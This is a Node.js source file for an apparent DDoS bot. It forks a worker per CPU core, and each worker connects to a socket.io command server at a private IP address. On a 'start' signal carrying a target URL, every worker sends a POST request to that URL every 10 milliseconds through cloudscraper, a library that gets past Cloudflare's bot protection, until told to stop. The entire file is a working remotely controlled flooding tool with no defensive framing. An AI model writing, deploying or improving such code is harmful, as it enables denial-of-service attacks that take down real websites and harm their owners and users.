const cluster = require('cluster');
const http = require('http');
const numCPUs = require('os').cpus().length;

if (cluster.isMaster) {
  console.log(`Master ${process.pid} is running`);

  // Fork workers.
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
    console.log(`worker ${worker.process.pid} died`);
  });
} else {
    var socket = require('socket.io-client')('http://192.168.3.218:3000');
    var cloudscraper = require('cloudscraper');
    var t =0;
    socket.on('connect', function(){
        console.log("Connected");
    });
    var s = 0;
    var url ="";
    socket.on('start', function(data){

        s=1;
        url=data;
      
    });
    socket.on('stop', function(data){

        s=0;
        t=0;
       // url=data;
      
    });
    socket.on('disconnect', function(){});
    
    setInterval(function(){
        if(s){
            var options = {
                uri: url,
                formData: { field1: 'value', field2: 2 }
              };
              t+=1;
              cloudscraper.post(options).then(console.log).catch(console.error);
        }
        else{

        }

    },10);
  console.log(`Worker ${process.pid} started`);
}
